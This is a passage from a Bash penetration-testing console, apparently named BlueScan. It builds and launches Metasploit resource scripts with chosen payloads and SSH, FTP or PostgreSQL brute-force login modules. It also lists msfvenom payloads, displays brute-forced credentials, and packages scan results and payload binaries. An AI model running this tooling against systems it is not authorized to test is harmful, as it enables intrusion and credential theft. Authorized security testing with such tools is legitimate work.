  echo -ne "${CYAN}Enter PAYLOAD (leave blank for default → $default_payload): ${NC}"
  read -r payload
  payload="${payload:-$default_payload}"

  echo "set PAYLOAD $payload" >> "$rc_file"
}



  # Handle login modules (SSH, FTP, PostgreSQL, etc)
  if [[ "$exploit_module" == *"login"* ]]; then
    echo -ne "${CYAN}Use wordlists or single creds? (w/s): ${NC}"
    read -r mode
    if [[ "$mode" == "w" ]]; then
      echo -ne "${CYAN}Path to USER_FILE: ${NC}"
      read -e user_file
      echo -ne "${CYAN}Path to PASS_FILE: ${NC}"
      read -e pass_file
      echo "set USER_FILE $user_file" >> "$rc_file"
      echo "set PASS_FILE $pass_file" >> "$rc_file"
    else
      echo -ne "${CYAN}Enter USERNAME: ${NC}"
      read username
      echo -ne "${CYAN}Enter PASSWORD: ${NC}"
      read password
      echo "set USERNAME $username" >> "$rc_file"
      echo "set PASSWORD $password" >> "$rc_file"
    fi

    # PostgreSQL specific: force session creation
    if [[ "$exploit_module" == *"postgres_login"* ]]; then
      echo "set CreateSession true" >> "$rc_file"
    fi
  fi

  echo "run -j" >> "$rc_file"
  echo -e "${GREEN}[auto_rc] .rc file created: $rc_file${NC}"
  log_event "[AUTO_RC] Created Metasploit resource script for $target_ip ($exploit_module)"

  # Launch it
  if command -v gnome-terminal &>/dev/null; then
    gnome-terminal -- bash -c "msfconsole -r '$rc_file'; exec bash"
  elif command -v xfce4-terminal &>/dev/null; then
    xfce4-terminal --hold -e "msfconsole -r '$rc_file'"
  elif command -v xterm &>/dev/null; then
    xterm -hold -e "msfconsole -r '$rc_file'"
  else
    echo -e "${RED}[auto_rc] No supported terminal found. Run manually: msfconsole -r $rc_file${NC}"
  fi

  rm -f temp_opts.txt
}

# ─────────────────────────────────────────────────────────────────────
# Manual RC Editor & Runner: Create or run an existing Metasploit .rc file
# ─────────────────────────────────────────────────────────────────────
metasploit_manual_rc_launcher() {
  echo -e "${YELLOW}[manual_rc] Manually create a custom Metasploit resource script${NC}"

  echo -ne "${CYAN}Enter filename for your .rc script (without extension): ${NC}"
  read rc_name
  rc_file="${rc_name}.rc"

  echo -e "${MAGENTA}[manual_rc] Type your msfconsole commands below, one per line.${NC}"
  echo -e "${MAGENTA}Type '${CYAN}done${MAGENTA}' when finished.${NC}"
  echo

  # Create/reset the file
  > "$rc_file"

  while true; do
    echo -ne "${MAGENTA}rc > ${NC}"
    read line
    [[ "$line" == "done" ]] && break
    echo "$line" >> "$rc_file"
  done

  echo

  # Validate file
  if [[ ! -s "$rc_file" ]]; then
    echo -e "${RED}[manual_rc] No commands entered. File is empty. Aborting.${NC}"
    rm -f "$rc_file"
    return
  fi

  echo -e "${GREEN}[manual_rc] .rc script saved to: $rc_file${NC}"
  log_event "[MANUAL_RC] Created custom RC script: $rc_file"
  echo -e "${CYAN}Preview of your script:${NC}"
  echo "──────────────────────────────────────────────"
  cat "$rc_file"
  echo "──────────────────────────────────────────────"

  echo -ne "${CYAN}Launch this in msfconsole now? (Y/n): ${NC}"
  read confirm

  if [[ "$confirm" =~ ^[Nn]$ ]]; then
    echo -e "${YELLOW}[manual_rc] Launch cancelled. Run manually: msfconsole -r $rc_file${NC}"
    return
  fi

  # Launch in a terminal
  if command -v gnome-terminal &>/dev/null; then
    gnome-terminal -- bash -c "msfconsole -r '$rc_file'; exec bash"
  elif command -v xfce4-terminal &>/dev/null; then
    xfce4-terminal --hold -e "msfconsole -r '$rc_file'"
  elif command -v xterm &>/dev/null; then
    xterm -hold -e "msfconsole -r '$rc_file'"
  else
    echo -e "${RED}[manual_rc] No supported terminal found. Run manually: msfconsole -r $rc_file${NC}"
  fi
}
metasploit_show_payloads() {
  echo -e "${MAGENTA}[meta] Loading msfvenom payload list with fuzzy search...${NC}"

  if ! command -v fzf &> /dev/null; then
    echo -e "${RED}[meta] 'fzf' not found. Install it to use fuzzy payload search.${NC}"
    echo -e "${YELLOW}Try: sudo apt install fzf${NC}"
    return
  fi

  msfvenom --list payloads 2>/dev/null | grep '/' | fzf --preview "msfvenom -p {} -h" \
    --prompt="🔍 Search payloads: " \
    --header="Press Enter to select a payload and view its help" \
    --preview-window=right:70%:wrap

  echo -e "${CYAN}[meta] Payload viewer closed.${NC}"
}




# ─────────────────────────────────────────────────────────────────────
# Metasploit Sub-Console: Custom environment for Metasploit tools
# ─────────────────────────────────────────────────────────────────────
metasploit_menu() {
  echo -e "${MAGENTA}Entering Metasploit sub-console... Type 'help' to see options.${NC}"

  while true; do
    # Display custom prompt for the metasploit environment
    echo -ne "${YELLOW}bluescan_meta > ${NC}"
    read -r meta_cmd

    case "$meta_cmd" in
      help)
        echo -e "${CYAN}Metasploit Console Commands:${NC}"
        echo -e "${GREEN}  payload${NC}         Create a payload with msfvenom"
        echo -e "${GREEN}  show_payloads${NC}   Show all available msfvenom payloads"
        echo -e "${GREEN}  auto_rc${NC}         Auto-generate an .rc file from scan results"
        echo -e "${GREEN}  write_rc${NC}        Manually create and launch an .rc file"
        echo -e "${GREEN}  back${NC}            Return to main BlueScan console"
        ;;

      payload)
        metasploit_payload_generator
        ;;

      auto_rc)
        metasploit_auto_rc_launcher
        ;;

      write_rc)
        metasploit_manual_rc_launcher
        ;;

      show_payloads)
        metasploit_show_payloads
        ;;

      back)
        echo -e "${CYAN}Returning to main BlueScan console...${NC}"
        break
        ;;

      *)
        echo -e "${RED}[meta] Unknown command. Type 'help' to see options.${NC}"
        ;;
    esac
  done
}
# ─────────────────────────────────────────────────────────────────────
# show_creds: Displays brute-force results from the creds module
# ─────────────────────────────────────────────────────────────────────
show_creds() {
  echo -e "${BLUE}[creds] Showing brute-force results...${NC}"

  # Check if the creds folder exists and has any files
  if [[ ! -d creds || -z "$(ls -A creds 2>/dev/null)" ]]; then
    echo -e "${RED}[creds] No credential results found. Run the creds module first.${NC}"
    return
  fi

  # Loop through all .txt files and display their contents
  for file in creds/*.txt; do
    echo -e "${YELLOW}--- Results from: ${file} ---${NC}"
    cat "$file"
    echo -e "${MAGENTA}------------------------------------------${NC}\n"
  done
}
# ─────────────────────────────────────────────────────────────────────
# Search Results Function: Keyword search across scan and creds outputs
# ─────────────────────────────────────────────────────────────────────
search_results() {
  echo -ne "${CYAN} Enter keyword(s) to search for (comma-separated): ${NC}"
  read -r keyword_input

  if [[ -z "$keyword_input" ]]; then
    echo -e "${RED}[search] You must enter at least one keyword.${NC}"
    return
  fi

  IFS=',' read -ra keywords <<< "$keyword_input"

  echo -e "${YELLOW} Where do you want to search?${NC}"
  echo -e "${GREEN}1) Basic scan results"
  echo -e "2) Full scan results"
  echo -e "3) Credential brute-force results"
  echo -e "4) Recon live hosts (live_hosts.txt)"
  echo -e "5) Metasploit RC files (*.rc)"
  echo -e "6) All${NC}"
  echo -ne "${CYAN}Choice [1-6]: ${NC}"
  read -r scope

  declare -a paths

  case "$scope" in
    1) paths=(scans/basic/*.txt) ;;
    2) paths=(scans/full/*.txt) ;;
    3) paths=(creds/*.txt) ;;
    4) paths=(live_hosts.txt) ;;
    5) paths=(*.rc) ;;
    6) paths=(scans/basic/*.txt scans/full/*.txt creds/*.txt live_hosts.txt *.rc) ;;
    *) echo -e "${RED}[search] Invalid choice.${NC}"; return ;;
  esac

  echo -ne "${CYAN} Save results to 'search_results.txt'? (y/n): ${NC}"
  read -r save_choice
  save_file="search_results.txt"
  [[ -f $save_file ]] && > "$save_file"

  echo -e "${MAGENTA}[search] Searching for keywords: ${keyword_input}...${NC}"

  found_any=false

  for file in "${paths[@]}"; do
    if [[ -f $file ]]; then
      file_matches=false
      for kw in "${keywords[@]}"; do
        if grep -iq "$kw" "$file"; then
          if ! $file_matches; then
            echo -e "\n${YELLOW}--- Results in: $file ---${NC}"
            [[ "$save_choice" =~ ^[Yy]$ ]] && echo -e "\n--- Results in: $file ---" >> "$save_file"
            file_matches=true
            found_any=true
          fi
          grep -i --color=always "$kw" "$file"
          [[ "$save_choice" =~ ^[Yy]$ ]] && grep -i "$kw" "$file" >> "$save_file"
        fi
      done
    fi
  done

  if ! $found_any; then
    echo -e "${RED}[search] No matches found for: ${keyword_input}.${NC}"
  else
    echo -e "\n${GREEN}[search] Search complete.${NC}"
    [[ "$save_choice" =~ ^[Yy]$ ]] && echo -e "${GREEN}[search] Results saved to: $save_file${NC}"
  fi
}

# ─────────────────────────────────────────────────────────────────────
# zip_bluescan_results
# ─────────────────────────────────────────────────────────────────────

zip_bluescan_results() {
  echo -e "${MAGENTA}[zip] Checking for scan data to package...${NC}"

  items_to_zip=()

  [[ -d scans ]] && items_to_zip+=("scans")
  [[ -d vulns ]] && items_to_zip+=("vulns")
  [[ -d creds ]] && items_to_zip+=("creds")
  [[ -f live_hosts.txt ]] && items_to_zip+=("live_hosts.txt")
  [[ -f audit.log ]] && items_to_zip+=("audit.log")

  # Add .rc files
  rc_files=(*.rc)
  for rc in "${rc_files[@]}"; do
    [[ -f "$rc" ]] && items_to_zip+=("$rc")
  done

  # Add payloads (common msfvenom extensions)
  for ext in exe elf raw bin; do
    for f in *."$ext"; do
      [[ -f "$f" ]] && items_to_zip+=("$f")
    done
  done

  if [[ ${#items_to_zip[@]} -eq 0 ]]; then
    echo -e "${RED}[zip] Nothing found to zip. Run some scans or generate payloads first.${NC}"
    return
  fi

  timestamp=$(date +"%Y%m%d_%H%M%S")
  zip_name="BlueScan_Report_${timestamp}.zip"

  echo -e "${BLUE}[zip] Creating archive: $zip_name${NC}"
  zip -r "$zip_name" "${items_to_zip[@]}" > /dev/null

  if [[ -f "$zip_name" ]]; then
    echo -e "${GREEN}[zip] Archive created: $zip_name${NC}"
    log_event "[ZIP] Created archive $zip_name including: ${items_to_zip[*]}"
  else
    echo -e "${RED}[zip] Failed to create archive.${NC}"
  fi
}
# ─────────────────────────────────────────────────────────────────────
# update_bluescan_tools: Ensures required tools are installed
# - Checks for: nmap, hydra, medusa, searchsploit, msfconsole, zip
# - If missing, attempts to install using apt (Debian-based)
# - Logs installed tools
# ─────────────────────────────────────────────────────────────────────
update_bluescan_tools() {
  echo -e "${MAGENTA}[update] Checking and updating required tools...${NC}"
  REQUIRED_TOOLS=(nmap hydra medusa searchsploit msfconsole zip)

  for tool in "${REQUIRED_TOOLS[@]}"; do
    if ! command -v "$tool" &>/dev/null; then
      echo -e "${YELLOW}[update] $tool not found. Attempting to install...${NC}"
      apt-get install -y "$tool" &>/dev/null
      if command -v "$tool" &>/dev/null; then
        echo -e "${GREEN}[update] $tool successfully installed.${NC}"
        log_event "[UPDATE] Installed missing tool: $tool"
      else
        echo -e "${RED}[update] Failed to install $tool. Please install it manually.${NC}"
        log_event "[UPDATE FAIL] Could not install $tool"
      fi
    else
      echo -e "${GREEN}[update] $tool already installed.${NC}"
    fi
  done

  echo -e "${CYAN}[update] Tool check complete.${NC}"
}


# Start CLI
clear
show_banner
setup_session
while true; do
  echo -ne "${MAGENTA}bluescan > ${NC}"
  read -r cmd 

  case "$cmd" in
    help)
      show_help
      ;;
    recon)
      run_recon
      ;;
    scan\ --basic)
      basic_scan
      ;;
    scan\ --full)
      full_scan
      ;;
    scan\ --berserk)
      berserk_scan
      ;;
    creds)
      bruteforce_menu
      ;;
      show\ creds)
      show_creds
      ;;
    metasploit)
      metasploit_menu
      ;;
    search)
      search_results
      ;;

    update)
      update_bluescan_tools
      ;;
    zip\ results)
      zip_bluescan_results
      ;;
    clear)
      clear
      ;;
    reset)
      reset_bluescan
      ;;
      
    exit|quit)
      echo -e "${GREEN}Goodbye, Opeartor.${NC}"
      break
      ;;
    *)
      echo -e "${RED}Unknown command. Type 'help' to see available options.${NC}"
      ;;
  esac
done


